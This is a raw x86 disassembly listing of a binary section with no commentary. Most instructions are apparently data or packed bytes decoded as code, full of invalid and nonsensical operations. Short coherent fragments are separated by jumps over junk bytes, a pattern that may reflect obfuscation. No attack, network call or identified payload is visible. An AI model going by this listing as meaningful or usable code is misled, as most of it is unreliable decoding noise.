  407c79:	mov    esp,0x2358237d
  407c7e:	xor    al,0x93
  407c80:	add    dl,ch
  407c82:	ins    BYTE PTR es:[edi],dx
  407c83:	pop    es
  407c84:	or     bh,BYTE PTR [ecx+0x12]
  407c87:	inc    ecx
  407c88:	xor    BYTE PTR [esp+eiz*8+0x2e],bh
  407c8c:	in     al,0xfa
  407c8e:	dec    edi
  407c8f:	xlat   BYTE PTR ds:[ebx]
  407c90:	sub    al,0x2f
  407c92:	push   esi
  407c93:	xchg   ah,ah
  407c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c96:	add    esi,esp
  407c98:	clc    
  407c99:	es pop edx
  407c9b:	adc    eax,DWORD PTR [ebp+ebx*8+0x6c]
  407c9f:	pop    esp
  407ca0:	push   ebp
  407ca1:	mov    ebx,0xa44bca05
  407ca6:	sar    BYTE PTR [esi+0x48],1
  407ca9:	cwde   
  407caa:	mov    esi,edi
  407cac:	inc    ecx
  407cad:	into   
  407cae:	xor    edx,eax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax+0x7ff7df88]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407d37
  407ce1:	int3   
  407ce2:	xchg   ebx,eax
  407ce3:	inc    esp
  407ce4:	fidivr WORD PTR [ecx+0x6e]
  407ce7:	push   0x2
  407ce9:	lock call DWORD PTR [eax+ebp*2+0x8]
  407cee:	xchg   ebp,eax
  407cef:	dec    edi
  407cf0:	mov    bh,BYTE PTR [eax-0x61]
  407cf3:	jnp    0x407c99
  407cf5:	in     al,0x80
  407cf7:	test   al,0xf6
  407cf9:	sbb    DWORD PTR [esi+0x61],esi
  407cfc:	cmp    esi,DWORD PTR es:[edx]
  407cff:	mov    edi,0x788919f6
  407d04:	mov    ds:0x6cd80e53,eax
  407d09:	add    edx,DWORD PTR [eax]
  407d0b:	sub    ah,BYTE PTR [eax-0x5a5a4a2d]
  407d11:	mov    ah,0xf6
  407d13:	test   esi,esp
  407d15:	rol    BYTE PTR cs:[eax],cl
  407d18:	xor    eax,0x186dfd8c
  407d1d:	adc    bl,BYTE PTR [ecx-0x32]
  407d20:	pusha  
  407d21:	dec    esp
  407d22:	(bad)  
  407d23:	scas   eax,DWORD PTR es:[edi]
  407d24:	adc    BYTE PTR [ebx+0x0],al
  407d27:	ss add eax,0xb8dd2d20
  407d2d:	dec    esi
  407d2e:	xchg   ecx,eax
  407d2f:	mov    BYTE PTR [edi],dl
  407d31:	mov    ah,0xfe
  407d33:	nop
  407d34:	xchg   DWORD PTR [ecx-0x7f9ac810],ebp
  407d3a:	adc    DWORD PTR [edi+esi*4+0x5e725800],esp
  407d41:	push   ds
  407d42:	mov    ?,WORD PTR [esi]
  407d44:	test   eax,0xe3761ae1
  407d49:	popa   
  407d4a:	test   al,0x35
  407d4c:	leave  
  407d4d:	outs   dx,DWORD PTR ds:[esi]
  407d4e:	sar    eax,0xf5
  407d51:	mov    dl,0x7
  407d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d54:	xchg   esp,eax
  407d55:	cmp    al,0xa4
  407d57:	lods   eax,DWORD PTR ds:[esi]
  407d58:	sbb    cl,BYTE PTR [esi-0x41]
  407d5b:	call   0xb93adc3b
  407d60:	add    DWORD PTR [ecx-0x6a],0xffffffb5
  407d64:	in     eax,dx
  407d65:	cld    
  407d66:	(bad)  
  407d67:	cli    
  407d68:	loopne 0x407d93
  407d6a:	(bad)  
  407d6b:	in     al,0x8c
  407d6d:	rcl    al,cl
  407d6f:	rcl    DWORD PTR [ecx-0x5d],1
  407d72:	mov    bh,0xb3
  407d74:	mov    es,WORD PTR [eax]
  407d76:	into   
  407d77:	mov    ds:0xf7f489f9,al
  407d7c:	jae    0x407d43
  407d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d7f:	lock sub al,0xaf
  407d82:	rol    DWORD PTR [edi],0x51
  407d85:	and    DWORD PTR [edi+0x2e],ebp
  407d88:	gs jne 0x407d52
  407d8b:	lea    edx,[ebp-0x52]
  407d8e:	(bad)  
  407d8f:	rol    edi,0x5a
  407d92:	mov    dh,0xd0
  407d94:	pop    edx
  407d96:	in     eax,dx
  407d97:	pop    ebp
  407d98:	and    DWORD PTR [edi-0x71],edx
  407d9b:	aas    
  407d9c:	or     esi,edx
  407d9e:	aaa    
  407d9f:	sub    ebx,ecx
  407da1:	inc    esp
  407da2:	retf   0xb3a0
  407da5:	scas   al,BYTE PTR es:[edi]
  407da6:	push   0xffbaf98a
  407dab:	pop    ebp
  407dac:	dec    esi
  407dad:	test   BYTE PTR [ebp+0x47],bh
  407db0:	enter  0xce2a,0x2b
  407db4:	inc    ebx
  407db5:	dec    edi
  407db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407db7:	aam    0x4b
  407db9:	enter  0xe0f2,0xd8
  407dbd:	sub    BYTE PTR [edi+0x38],ch
  407dc0:	inc    edx
  407dc1:	xchg   edx,eax
  407dc2:	ror    DWORD PTR [edi+eax*1-0x147ef3e6],1
  407dc9:	(bad)  
  407dca:	adc    esi,DWORD PTR [ecx]
  407dcc:	mov    ah,0xda
  407dce:	ds cs push edi
  407dd1:	mov    dh,0x1b
  407dd3:	stos   DWORD PTR es:[edi],eax
  407dd4:	sahf   
  407dd5:	test   DWORD PTR [ebp+0x2df4a09],eax
  407ddb:	push   ebp
  407ddc:	jmp    0xbbf5:0x4dde4d67
  407de3:	mov    ds:0x2a45ed6c,eax
  407de8:	scas   al,BYTE PTR es:[edi]
  407de9:	rcl    BYTE PTR [esp+esi*2-0x10efa3db],0x86
  407df1:	aaa    
  407df2:	fwait
  407df3:	rol    BYTE PTR [esi-0x56de17b7],cl
  407df9:	jb     0x407e75
  407dfb:	cmp    DWORD PTR [ebx+0x24a63fb7],0x8289cf31
  407e05:	xchg   ebp,eax
  407e06:	call   0xf4ca:0xe2b72489
  407e0d:	inc    eax
  407e0e:	nop
  407e0f:	mov    dl,0xb7
  407e11:	inc    edi
  407e12:	pop    ds
  407e13:	add    DWORD PTR [eax+0x2a],edi
  407e16:	xor    edx,DWORD PTR [esi+0x4c]
  407e19:	dec    ecx
  407e1a:	jmp    0x407dde
  407e1c:	mov    esi,0x409ee9b8
  407e21:	outs   dx,DWORD PTR ds:[esi]
  407e22:	out    dx,al
  407e23:	sbb    al,0xbf
  407e25:	shr    al,1
  407e27:	add    DWORD PTR [edx],ebp
  407e29:	mov    eax,0x961b400
  407e2e:	xchg   esp,eax
  407e2f:	pop    ds
  407e30:	ror    BYTE PTR ss:[ecx-0x1c],1
  407e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e35:	mov    ds:0xc2bf44d,eax
  407e3a:	rcl    BYTE PTR [esi-0x47a7d556],cl
  407e40:	ds enter 0x12cb,0xf7
  407e45:	ins    BYTE PTR es:[edi],dx
  407e46:	(bad)  
  407e47:	mov    esp,0xaec06af9
  407e4c:	jmp    0x920dcb6f
  407e51:	sub    dh,BYTE PTR [edx+0x3c]
  407e54:	add    eax,0xd711fd50
  407e59:	cld    
  407e5a:	jl     0x407e0f
  407e5c:	inc    esi
  407e5d:	outs   dx,BYTE PTR ds:[esi]
  407e5e:	outs   dx,DWORD PTR ds:[esi]
  407e5f:	std    
  407e60:	xor    ch,BYTE PTR [edx+edx*8+0x23bc38a3]
  407e67:	pushf  
  407e68:	cmp    eax,0x755e841a
  407e6d:	mov    BYTE PTR [esi],0xb9
  407e70:	push   cs
  407e71:	arpl   WORD PTR [eax+0x43],di
  407e74:	ja     0x407e82
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	xchg   edx,eax
  407e9e:	and    al,0xdc
  407ea0:	repnz adc ebp,ecx
  407ea3:	jle    0x407f23
  407ea5:	mov    bh,BYTE PTR [edi+0x7e]
  407ea8:	jle    0x407e52
  407eaa:	outs   dx,BYTE PTR ds:[esi]
  407eab:	shr    BYTE PTR [ecx],0xa8
  407eae:	mov    esp,0x88f2c91c
  407eb3:	jo     0x407e96
  407eb5:	shl    DWORD PTR [edx],0x72
  407eb8:	jns    0x407e82
  407eba:	test   DWORD PTR [ecx+0x64f112b6],ebp
  407ec0:	xchg   DWORD PTR [ecx+0x42],eax
  407ec3:	sub    al,0xb8
  407ec5:	es ja  0x407e59
  407ec8:	mov    bh,0xae
  407eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ecb:	sahf   
  407ecc:	jns    0x407f22
  407ece:	test   dl,ch
  407ed0:	outs   dx,DWORD PTR ds:[esi]
  407ed1:	xor    DWORD PTR [ebp+ecx*4+0x1b8fe75f],edi
  407ed8:	or     DWORD PTR [eax+0x7ced21b0],edi
  407ede:	jmp    0x46f5657a
  407ee3:	sbb    eax,0xc8887182
  407ee8:	addr16 call 0x7163:0x2a205109
  407ef0:	(bad)  
  407ef1:	and    DWORD PTR [ebp+0x30],0x23340f46
  407ef8:	dec    esi
  407ef9:	fild   QWORD PTR [eax+0x19d0157a]
  407eff:	inc    edx
  407f00:	jp     0x407ece
  407f02:	xor    eax,0x27a22046
  407f07:	adc    eax,0x2959af72
  407f0c:	xchg   ch,ah
  407f0e:	lea    edi,[ecx-0x3f]
  407f11:	(bad)  
  407f12:	mov    ecx,fs
  407f14:	or     eax,0x659d9ef1
  407f19:	scas   eax,DWORD PTR es:[edi]
  407f1a:	js     0x407f8e
  407f1c:	test   DWORD PTR gs:[edi-0x4a],esi
  407f20:	pop    esi
  407f21:	xchg   DWORD PTR [eax],edi
  407f23:	push   ebx
  407f24:	icebp  
  407f25:	paddsb mm3,QWORD PTR [eax]
  407f28:	sti    
  407f29:	sti    
  407f2a:	pop    edi
  407f2b:	sub    eax,0x58e637c
  407f30:	not    ebp
  407f32:	int3   
  407f33:	mov    BYTE PTR [eax],dh
  407f35:	mov    dh,0x35
  407f37:	fld    TBYTE PTR [edi]
  407f39:	es hlt 
  407f3b:	out    dx,eax
  407f3c:	jnp    0x407efd
  407f3e:	dec    ebp
  407f3f:	out    0xe4,eax
  407f41:	push   ss
  407f42:	imul   ebx,DWORD PTR [ebp-0x65],0xe50deeca
  407f49:	nop
  407f4a:	add    DWORD PTR [eax-0x45],0x97612084
  407f51:	pusha  
  407f52:	pop    es
  407f53:	test   BYTE PTR [edx-0x1c],cl
  407f56:	and    dh,BYTE PTR [esi]
  407f58:	push   edi
  407f59:	sahf   
  407f5a:	cmc    
  407f5b:	xor    ebp,DWORD PTR [edx-0x75f5b052]
  407f61:	sbb    ch,ch
  407f63:	and    eax,0xe812c749
  407f68:	icebp  
  407f69:	add    eax,0xf3e07e60
  407f6e:	sar    DWORD PTR [esi],0x4a
  407f71:	and    DWORD PTR [ebp+0x18b2885c],0xa1eb2f99
  407f7b:	add    DWORD PTR [eax],edi
  407f7d:	cmp    BYTE PTR [edx],bl
  407f7f:	push   ss
  407f80:	xchg   ebp,eax
  407f81:	push   0xdfcef391
  407f86:	adc    eax,0xcd50c7f4
  407f8b:	out    0x80,eax
  407f8d:	mov    ebx,fs
  407f8f:	mov    ds:0x845b3451,eax
  407f94:	sub    edx,DWORD PTR [ebp+ecx*2-0x6a4e61d2]
  407f9b:	inc    esp
  407f9c:	push   esp
  407f9d:	xlat   BYTE PTR ds:[ebx]
  407f9e:	neg    DWORD PTR [ebx]
  407fa0:	ficomp WORD PTR [ecx+ecx*2-0x4]
  407fa4:	mov    ebp,0xb00eafca
  407fa9:	retf   
  407faa:	push   es
  407fab:	xchg   edx,eax
  407fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fad:	and    cl,ch
  407faf:	ret    0xdeb
  407fb2:	gs int3 
  407fb4:	push   edi
  407fb5:	or     al,0x2d
  407fb7:	out    0x4c,al
  407fb9:	mov    dh,0xab
  407fbb:	xchg   ebx,eax
  407fbc:	add    BYTE PTR [ebx+0x0],bl
  407fbf:	int3   
  407fc0:	retf   0x90e8
  407fc3:	in     al,dx
  407fc4:	(bad)  
  407fc5:	pop    esi
  407fc6:	push   esp
  407fc7:	sbb    DWORD PTR [edi+0x260eec30],ebp
  407fcd:	dec    ebx
  407fce:	adc    edx,DWORD PTR [ebx]
  407fd0:	xchg   ebx,eax
  407fd1:	cdq    
  407fd2:	jge    0x407f64
  407fd4:	outs   dx,BYTE PTR ds:[esi]
  407fd5:	xchg   edx,eax
  407fd6:	sub    al,0x10
  407fd8:	adc    al,0xf7
  407fda:	pop    esi
  407fdb:	adc    eax,0x6b31640
  407fe0:	adc    DWORD PTR [edi-0x7a],eax
  407fe3:	pop    edx
  407fe4:	je     0x40802a
  407fe6:	loop   0x407f94
  407fe8:	mov    eax,ds:0xca8a6918
  407fed:	sbb    ch,BYTE PTR [edi]
  407fef:	std    
  407ff0:	sbb    al,0x1b
  407ff2:	xchg   ecx,eax
  407ff3:	in     eax,dx
  407ff4:	(bad)  
  407ff5:	xchg   esp,eax
  407ff6:	inc    ebp
  407ff7:	scas   al,BYTE PTR es:[edi]
  407ff8:	sbb    bl,BYTE PTR [esi+edi*4-0x4f]
  407ffc:	jo     0x407fc7
  407ffe:	mov    edx,0x29b14f15
  408003:	test   ecx,0x6d8cca91
  408009:	mov    ebx,0xe32a6a0d
  40800e:	jmp    0x7164:0x65fa8ec1
  408015:	pop    es
  408016:	aad    0x63
  408018:	inc    esi
  408019:	or     DWORD PTR [ebx+0x44],edi
  40801c:	dec    ecx
  40801d:	mov    dl,0x9c
  40801f:	imul   ebx,DWORD PTR [edx],0x657f114c
  408025:	stos   BYTE PTR es:[edi],al
  408026:	mov    ecx,0x6ddf3adb
  40802b:	jmp    0x39a81dd1
  408030:	inc    eax
  408031:	ror    esp,1
  408033:	cmp    DWORD PTR [edi],0x6a633992
  408039:	mov    dh,0x97
  40803b:	adc    eax,0x3f9039a
  408040:	ror    DWORD PTR [edi],1
  408042:	scas   eax,DWORD PTR es:[edi]
  408043:	xlat   BYTE PTR ds:[ebx]
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	out    0x9f,al
  40807b:	test   DWORD PTR [edi-0x53],esp
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x408036
  408086:	(bad)  
  408087:	pop    esp
  408088:	aam    0x6e
  40808a:	cmc    
  40808b:	jbe    0x408040
  40808d:	fadd   DWORD PTR [eax-0x65907c44]
  408093:	or     esp,esp
  408095:	mov    eax,0x16d58e67
  40809a:	mov    ds:0x59b0d99a,al
  40809f:	neg    BYTE PTR [eax+0x53]
  4080a2:	and    al,0xc2
  4080a4:	mov    eax,0x794cb833
  4080a9:	jmp    0xcfa2:0xd9dc987c
  4080b0:	push   edi
  4080b1:	add    cl,ah
  4080b3:	fnsave [edx+0x42]
  4080b6:	cmp    BYTE PTR [edx],bl
  4080b8:	pop    edi
  4080b9:	push   esp
  4080ba:	clc    
  4080bb:	push   eax
  4080bc:	shl    DWORD PTR [ebx-0x71b518bd],0x2b
  4080c3:	add    dh,dh
  4080c5:	pop    ebx
  4080c6:	inc    edi
  4080c7:	sub    al,0x2b
  4080c9:	adc    BYTE PTR [ecx],ch
  4080cb:	arpl   WORD PTR [ebx+0x24973934],bp
  4080d1:	bound  ebx,QWORD PTR [esi-0x1aace7a2]
  4080d7:	mov    ch,0xc9
  4080d9:	xchg   edi,eax
  4080da:	es repz arpl bx,dx
  4080de:	je     0x40808b
  4080e0:	int3   
  4080e1:	jnp    0x408131
  4080e3:	and    bl,BYTE PTR [ecx-0x27]
  4080e6:	xchg   edi,eax
  4080e7:	xchg   esp,eax
  4080e8:	cmc    
  4080e9:	dec    edi
  4080ea:	push   esi
  4080eb:	pop    ebp
  4080ec:	push   ss
  4080ed:	loope  0x40810d
  4080ef:	add    BYTE PTR [eax-0x41ebae34],dh
  4080f5:	loope  0x408096
  4080f7:	mov    ebx,0xa839856b
  4080fc:	cwde   
  4080fd:	sub    ebp,DWORD PTR [ebp-0x280a74f7]
  408103:	ret    
  408104:	mov    ebp,0x7890a517
  408109:	push   0xf7f5a148
  40810e:	test   al,0xb
  408110:	mov    edi,0x1051d801
  408115:	mov    ebp,0x6296424c
  40811a:	mov    cl,0xc4
  40811c:	dec    esi
  40811d:	add    bh,0x0
  408120:	dec    esp
  408121:	push   eax
  408122:	xchg   ecx,eax
  408123:	mov    esi,DWORD PTR [edi+0x4a]
  408126:	mov    ds:0x2cd9a0f2,eax
  40812b:	jg     0x408182
  40812d:	jecxz  0x40810c
  40812f:	sbb    DWORD PTR [ebp-0x6ad82446],0xffffffc7
  408136:	dec    edi
  408137:	lea    ebp,[ecx+0x4e]
  40813a:	cmp    DWORD PTR [ecx+0x43],ebp
  40813d:	lea    ebp,[ecx-0x63]
  408140:	int    0x90
  408142:	scas   eax,DWORD PTR es:[edi]
  408143:	mov    eax,0xdd901cd0
  408148:	pop    esp
  408149:	jbe    0x408152
  40814b:	repz mov ebp,0x7bd32ad3
  408151:	jecxz  0x408156
  408153:	scas   al,BYTE PTR es:[edi]
  408154:	sub    al,0x3c
  408156:	mov    eax,0xda983bd7
  40815b:	sub    al,0x9d
  40815d:	in     al,0x14
  40815f:	inc    edx
  408160:	xchg   BYTE PTR [edx],al
  408162:	sub    al,0xfa
  408164:	jne    0x4081cc
  408166:	sbb    al,0x7d
  408168:	test   al,0x3b
  40816a:	xchg   DWORD PTR [ebp+eax*2+0x24dfbea2],esp
  408171:	into   
  408172:	stc    
  408173:	dec    eax
  408174:	sbb    dl,bh
  408176:	dec    ebp
  408177:	(bad)  
  408178:	out    0xb7,al
  40817a:	jae    0x408143
  40817c:	pushf  
  40817d:	dec    ebp
  40817e:	adc    esp,DWORD PTR ds:0x9faf1e8c
  408184:	xchg   ebx,eax
  408185:	cmovs  ebx,edi
  408188:	jae    0x4081b4
  40818a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40818b:	mov    al,ds:0x1521f158
  408190:	mov    eax,0xb69fcc48
  408195:	icebp  
  408196:	das    
  408197:	jbe    0x4081c4
  408199:	imul   esp,DWORD PTR [esi+0x6eeab770],0xffffffa4
  4081a0:	mov    eax,0xd2e9fdc4
  4081a5:	dec    edi
  4081a6:	xor    BYTE PTR [esi+eax*8],ch
  4081a9:	dec    esp
  4081aa:	or     BYTE PTR [ebx],al
  4081ac:	les    edx,FWORD PTR [esi]
  4081ae:	add    BYTE PTR [ecx-0x5f21287e],0xd6
  4081b5:	dec    eax
  4081b6:	push   0x28
  4081b8:	addr16 push ds
  4081ba:	xor    al,0x8
  4081bc:	cmp    DWORD PTR [ebx],esi
  4081be:	imul   esi,edi,0x83f28f50
  4081c4:	mov    esi,0x1c0ad633
  4081c9:	sti    
  4081ca:	mov    cl,BYTE PTR [eax-0x3ea99f71]
  4081d0:	cmp    ebp,esi
  4081d2:	js     0x408193
  4081d4:	lock adc eax,0x6ac06246
  4081da:	gs inc esi
  4081dc:	scas   eax,DWORD PTR es:[edi]
  4081dd:	pop    eax
  4081de:	rcl    DWORD PTR [edi-0x1a],0xfa
  4081e2:	cmp    DWORD PTR [eax],ebx
  4081e4:	aaa    
  4081e5:	adc    DWORD PTR [eax+0x6f6b8ced],edx
  4081eb:	mov    ds:0x70109b8a,eax
  4081f0:	cmp    eax,DWORD PTR [esi]
  4081f2:	cmp    DWORD PTR [esi+edx*1],0x1d
  4081f6:	xchg   ecx,eax
  4081f7:	add    eax,ecx
  4081f9:	cmp    ecx,DWORD PTR [esp+ecx*4-0x45]
  4081fd:	dec    edi
  4081fe:	(bad)  
  4081ff:	repnz cwde 
  408201:	sub    DWORD PTR [ebx-0x4aa7ee45],ecx
  408207:	sbb    BYTE PTR [ebx+edi*1+0x30],bh
  40820b:	div    DWORD PTR [esi]
  40820d:	jno    0x408236
  40820f:	fsubp  st(0),st
  408211:	and    ch,BYTE PTR [ebp-0x1]
  408214:	fs dec esp
  408216:	js     0x4081e3
  408218:	pop    eax
  408219:	add    edx,ecx
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3993:0x59976762
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408219
  408239:	outs   dx,DWORD PTR ds:[esi]
  40823a:	mul    DWORD PTR [ecx-0x29b5a545]
  408240:	fist   DWORD PTR [ebp-0x2d]
  408243:	add    eax,DWORD PTR ds:0xe8177598
  408249:	adc    al,0x36
  40824b:	push   ss
  40824c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40824d:	or     dl,BYTE PTR [eax+0x79155456]
  408253:	push   es
  408254:	cli    
  408255:	dec    eax
  408256:	loopne 0x40820b
  408258:	push   cs
  408259:	pop    ss
  40825a:	or     BYTE PTR [edi+0x11],cl
  40825d:	push   ebx
  40825e:	pop    ss
  40825f:	inc    esi
  408260:	mov    ds:0x506a23ca,al
  408265:	(bad)  
  408266:	jmp    0xf955:0x52d05810
  40826d:	fsubr  QWORD PTR [edx]
  40826f:	mov    ah,0x8f
  408271:	and    BYTE PTR [ecx],dh
  408273:	sub    eax,0xf11ae0c5
  408278:	inc    dl
  40827a:	fcom   QWORD PTR [ecx]
  40827c:	and    eax,0x95395bcc
  408281:	nop
  408282:	inc    esp
  408283:	js     0x40828c
  408285:	mov    al,0xf7
  408287:	fidivr DWORD PTR [ebx]
  408289:	addr16 push edi
  40828b:	xlat   BYTE PTR ds:[ebx]
  40828c:	push   0xa8ebe46c
  408291:	mov    ecx,0x23726d79
  408296:	outs   dx,BYTE PTR ds:[esi]
  408297:	fsub   DWORD PTR [eax-0x13]
  40829a:	sub    edi,edi
  40829c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40829d:	adc    eax,0x6b1dbd7d
  4082a2:	in     eax,0xb0
  4082a4:	mov    ds:0x2af825df,al
  4082a9:	ins    BYTE PTR es:[edi],dx
  4082aa:	iret   
  4082ab:	jo     0x4082a6
  4082ad:	leave  
  4082ae:	mov    esi,0xfc1acad9
  4082b3:	loopne 0x4082f5
  4082b5:	arpl   WORD PTR [edi+0x1f],bx
  4082b8:	adc    al,0xf9
  4082ba:	inc    ebp
  4082bb:	push   cs
  4082bc:	outs   dx,BYTE PTR ds:[esi]
  4082bd:	ins    BYTE PTR es:[edi],dx
  4082be:	mov    al,0x26
  4082c0:	cli    
  4082c1:	mov    DWORD PTR [edx+0x22be476c],esp
  4082c7:	mov    edx,0x58b52f2c
  4082cc:	mov    ds:0x50107fbb,al
  4082d1:	stos   DWORD PTR es:[edi],eax
  4082d2:	daa    
  4082d3:	iret   
  4082d4:	inc    esp
  4082d5:	fisttp QWORD PTR [eax-0x1c2b450d]
  4082db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082dc:	xor    BYTE PTR [ebx+eiz*2+0x479d8f79],ch
  4082e3:	push   0xff20203b
  4082e8:	and    al,0xd6
  4082ea:	test   eax,0x3097f10d
  4082ef:	or     BYTE PTR [edx+0x6],ch
  4082f2:	jmp    0xdecfed0
  4082f7:	aam    0xf2
  4082f9:	adc    al,0x5c
  4082fb:	sub    ebp,eax
  4082fd:	mov    ds:0x9a7d3696,eax
  408302:	mov    ebx,0x13f02451
  408307:	jg     0x408358
  408309:	mov    al,ds:0x3ac4bddc
  40830e:	lahf   
  40830f:	cmp    BYTE PTR [ecx-0x6f6bf01],0xab
  408316:	retf   0x2207
  408319:	bound  edx,QWORD PTR [esi-0x1dabb818]
  40831f:	mov    ds:0xb69028c8,al
  408324:	pop    ss
  408325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408326:	add    bh,cl
  408328:	mov    DWORD PTR [ecx+0x13],ebx
  40832b:	sbb    al,BYTE PTR [edi+esi*2-0x46d7cba]
  408332:	mov    bh,0x54
  408334:	mov    ch,0x4e
  408336:	push   ebp
  408337:	jmp    0x4083a6
  408339:	sub    BYTE PTR [ebx-0x16],dl
  40833c:	das    
  40833d:	cmp    DWORD PTR [edx+0x3a],ebp
  408340:	in     al,0xd5
  408342:	jmp    0x4082d4
  408344:	arpl   WORD PTR [ecx],sp
  408346:	mov    ebp,0x72255a83
  40834b:	loopne 0x4083b0
  40834d:	xor    BYTE PTR [edi-0x2e1d1d32],dh
  408353:	std    
  408354:	jl     0x4082e9
  408356:	call   FWORD PTR [ebp+0x665c41b5]
  40835c:	data16 and cl,BYTE PTR [ecx]
  40835f:	jmp    DWORD PTR [eax+edx*1]
  408362:	dec    edi
  408363:	and    DWORD PTR [ecx],0xffffffc3
  408366:	mov    esi,0x625727bd
  40836b:	xchg   esi,eax
  40836c:	xchg   edi,ebx
  40836e:	sar    DWORD PTR [ebp-0x35478d10],0x95
  408375:	mov    ecx,?
  408377:	sbb    al,0x27
  408379:	out    0x76,eax
  40837b:	nop
  40837c:	mov    eax,0x120085d5
  408381:	dec    ebp
  408382:	add    al,bh
  408384:	std    
  408385:	jp     0x408404
  408387:	cdq    
  408388:	and    ebp,DWORD PTR [esi]
  40838a:	jns    0x408400
  40838c:	gs cmp al,0x53
  40838f:	pop    edx
  408390:	sar    BYTE PTR [ebp+0x5e457335],0xce
  408397:	pop    esp
  408398:	cwde   
  408399:	inc    ecx
  40839a:	adc    al,0xc9
  40839c:	jnp    0x40839a
  40839e:	stos   BYTE PTR es:[edi],al
  40839f:	jg     0x408395
  4083a1:	dec    edi
  4083a2:	lea    ecx,[edi+0x72659ddc]
  4083a8:	mov    ?,ebp
  4083aa:	pop    ds
  4083ab:	daa    
  4083ac:	pop    es
  4083ad:	jns    0x408353
  4083af:	or     al,0x6
  4083b1:	adc    BYTE PTR [edi+eiz*4+0x5bd78b8c],cl
  4083b8:	scas   al,BYTE PTR es:[edi]
  4083b9:	(bad)  
  4083ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083bb:	sub    eax,0x16734e6
  4083c0:	repz aam 0x55
  4083c3:	xchg   edi,eax
  4083c4:	dec    edi
  4083c5:	jbe    0x4083c1
  4083c7:	xor    edx,DWORD PTR [esi]
  4083c9:	push   edi
  4083ca:	icebp  
  4083cb:	js     0x4083dc
  4083cd:	scas   eax,DWORD PTR es:[edi]
  4083ce:	xlat   BYTE PTR ds:[ebx]
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	pushf  
  4083e9:	out    dx,al
  4083ea:	pop    ecx
  4083eb:	and    DWORD PTR [ebp-0x37],edx
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x4083cd
  4083f5:	mov    eax,ds:0xfa4b9037
  4083fa:	ins    DWORD PTR es:[edi],dx
  4083fb:	hlt    
  4083fc:	or     DWORD PTR [ecx-0x39],esp
  4083ff:	pusha  
  408400:	or     dl,BYTE PTR [edi+0x3e09374c]
  408406:	ins    BYTE PTR es:[edi],dx
  408407:	repz daa 
  408409:	mov    ecx,0x1d111e76
  40840e:	cs push ebp
  408410:	mov    ebp,0x87d1a267
  408415:	add    esi,edi
  408417:	mov    bl,0x22
  408419:	or     DWORD PTR [eax],esi
  40841b:	stc    
  40841c:	cld    
  40841d:	mov    ds:0xd6a28fdc,al
  408422:	and    cl,al
  408424:	cmp    BYTE PTR [edi+esi*2],ah
  408427:	(bad)  
  408428:	fst    QWORD PTR [esi+0x33]
  40842b:	mov    ds:0xc673d3e3,eax
  408430:	sar    BYTE PTR [ebp+0x7d24a5f8],cl
  408436:	inc    esp
  408437:	xor    DWORD PTR [edx],ebp
  408439:	mov    WORD PTR [edi+0x40],fs
  40843c:	adc    DWORD PTR [eax+edx*4-0x34],ebp
  408440:	dec    edi
  408441:	mov    al,BYTE PTR [eax]
  408443:	cli    
  408444:	sbb    al,0xbf
  408446:	imul   edi,DWORD PTR [esp+edi*1+0x19577025],0xffffffe9
  40844e:	outs   dx,DWORD PTR ds:[esi]
